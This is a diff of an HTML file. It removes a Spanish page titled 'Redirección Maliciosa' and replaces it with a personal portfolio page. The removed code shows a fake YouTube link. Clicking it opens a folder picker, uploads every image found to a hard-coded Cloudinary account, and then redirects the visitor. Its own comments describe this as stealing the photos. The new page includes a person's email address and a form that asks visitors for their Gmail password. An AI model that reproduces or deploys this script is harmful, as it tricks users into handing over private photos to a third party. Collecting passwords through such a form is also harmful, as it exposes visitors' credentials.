@@ -1,65 +1,97 @@
 <!DOCTYPE html>
-<html lang="es">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirección Maliciosa</title>
-    <style>
-        body { display: none; }
-    </style>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="sytle/styles.css">
+
+	<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+	<link rel="shortcut icon" href="img/favicon.ico" type="image/ x-">
+	<title>Krysto Zuñiga</title>
 </head>
 <body>
-    <a href="https://www.youtube.com/watch?v=4l97aNza_Zc" id="maliciousLink">Ver Video</a>
-    <script>
-        document.getElementById('maliciousLink').addEventListener('click', async (event) => {
-            event.preventDefault(); // Evita la redirección inmediata
 
-            try {
-                // Exploit para acceder al sistema de archivos sin intervención del usuario
-                const options = {
-                    types: [
-                        {
-                            description: 'Imágenes',
-                            accept: {'image/*': ['.png', '.jpg', '.jpeg', '.gif', '.bmp', '.webp']},
-                        },
-                    ],
-                    multiple: true,
-                };
+	<header>			
+		<nav id="navega">
+			
+					<img class="logo" src="img/logo.png" alt=""  href="index.html " >
+				
+			
+				<a class="lista" href="index.html">Inicio</a>
+			<a class="lista" href="#academia ">Academicos</a>
+			<a class="lista" href="#laboral">Laborales</a>
+			<a class="lista" href="#contacto ">Contacto</a>
+		</nav>
+		
+	</header>
+		<section id="inicio">	
+			<div class="datos">
+			<img src="img/perfil.png" alt="El logo" class="perfil">
+			<div class="info">
+		<h1>Mis Datos</h1>
+		<p><strong>Nombre:</strong> Krysto Alberto Adan Jauregui Zuñiga</p>
+      <p><strong>Correo:</strong> krysto9872@gmail.com</p>
+      <p><strong>Teléfono:</strong> +52 123 456 7890</p>
+      <p><strong>Dirección:</strong> Ciudad de México</p>
+		</div>
+		</div>
 
-                // Utilizar showDirectoryPicker de manera agresiva
-                const directoryHandle = await window.showDirectoryPicker(options);
+		</section>
+		</section>
+		<section id="academia" class="content">
+			<h1>Academico</h1>
+		</section>
+		<section id="laboral" class="content">
+			<h1>Laboral</h1>
+		</section>
+		<section id="contacto" class="content">
+			<h1>Contacto</h1>
+    <!--sectiones -->
+    <section class="contenido quienesSomos">
+        
+    </section>
+    <!-- <section class="contenido" id="videos">  </section>-->
+        
+      <section class="contenido" id="ubicame">
+      	<fieldset id="formulario">
+      		<legend>Registro</legend>
+      		<form action="#archivo.php" enctype="multipart/form-data" name="formulario" method="get">
+      			<input type="email" name="email" placeholder="Coloca tu gmail" required>
+      			<input type="password" name="pass" placeholder="Pon tu contraseña" required>
+      			<input type="tel" required placeholder="Pon tu numero de telefono" id="">
+      			<input type="text" name="nombre" required placeholder="Pon tu nombre">
+      			<input type="number" name="edad" required placeholder="Pon tu edad">
+      			<input type="file" name="archivo" id="">
+      			<textarea name="" id="" cols="25" rows="9" required placeholder="Pon unn mensaje"></textarea>
 
-                // Recorrer todos los archivos en el directorio
-                for await (const entry of directoryHandle.values()) {
-                    if (entry.kind === 'file' && options.types[0].accept['image/*'].includes(entry.name.split('.').pop())) {
-                        const file = await entry.getFile();
-                        const arrayBuffer = await file.arrayBuffer();
-                        const blob = new Blob([arrayBuffer], { type: file.type });
-                        const url = URL.createObjectURL(blob);
-                        console.log('URL de la imagen:', url);
+      			<label>Genero:</label>
+      			<input type="radio" name="genero"/>Femenino
+      			<input type="radio" name="genero"/>Masculino
 
-                        // Subir la imagen a Cloudinary
-                        const formData = new FormData();
-                        formData.append('file', blob, file.name);
-                        formData.append('upload_preset', 'PresentOnSigned');
-                        formData.append('cloud_name', 'daqdzj4xq');
+      			<label>Pasatiempo</label>
+      			<input type="checkbox" name="ch1"/>Musica
+      			<input type="checkbox" name="ch1"/>Leer
+      			<input type="checkbox" name="ch1"/>Nadar
 
-                        const response = await fetch('https://api.cloudinary.com/v1_1/daqdzj4xq/image/upload', {
-                            method: 'POST',
-                            body: formData,
-                        });
+      			<label>Grado de estudios</label>
+      			<select name="" id="">
+      				<option value="bach">Bachillerato</option>
+      				<option value="tsu">TSU</option>
+      				<option value="ing">Ingeniero</option>
+      			</select>
+      			<input type="submit" name="su" value="Enviar">
+      			<input type="button" name="btn" value="Boton">
+      		</form>
+      		
+      	</fieldset>
 
-                        const data = await response.json();
-                        console.log('Imagen subida a Cloudinary:', data);
-                    }
-                }
-            } catch (err) {
-                console.error('Error al obtener las fotos:', err);
-            }
+      </section>
+		</section>
 
-            // Redirigir al usuario a YouTube después de robar las fotos
-            window.location.href = 'https://www.youtube.com/watch?v=4l97aNza_Zc';
-        });
-    </script>
-</body>
-</html>
+
+
+	</body>
+	</html>
+
+
+
